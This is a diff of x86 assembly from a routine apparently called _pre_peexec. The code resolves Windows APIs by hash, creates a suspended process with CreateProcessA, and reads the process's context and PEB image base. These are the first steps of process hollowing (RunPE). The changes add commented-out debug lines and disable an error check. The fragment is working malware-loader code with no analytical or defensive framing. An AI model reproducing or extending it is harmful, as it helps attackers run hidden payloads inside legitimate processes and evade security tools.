@@ -8,16 +8,25 @@ _pre_peexec:
 
 
   ; Create processus
+  
+; # int 3
+; # invokel _getdll,HASH_KERNEL32.DLL
+; # invokel _getfunction, eax, HASH_GETLASTERROR
+; # push eax
+
   invokel _getdll,HASH_KERNEL32.DLL
   invokel _getfunction, eax, HASH_CREATEPROCESSA
-
 
   lea ebx, [ebp + MYSTRU__FILENAME]
   lea ecx,[ebp + MYSTRU__OPTION]
   lea edx,[ebp + MYSTRU__PIS] 
   invokel eax ,ebx ,  ecx , NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, ebp, edx
-  cmp eax,0
+  
+; # pop eax
+  ; on error eax=1
+  ;cmp eax,0
   ; je .end
+ ; #call eax 
 
 
   ; Set type as context full
@@ -44,7 +53,7 @@ _pre_peexec:
   mov ecx,[ecx+PROCESS_INFORMATION__hProcess]
   lea ebx,[ebp + MYSTRU__CTX] 
   mov ebx,[ebx+CTX__EBX]
-    add        ebx,PEB__ImageBaseAdress                 ; Pointera sur PEB + 8  
+  add        ebx,PEB__ImageBaseAdress                 ; Pointera sur PEB + 8  
   invokel eax, ecx, ebx, vRPEBASE, 4, NULL  
   
   cmp eax,0
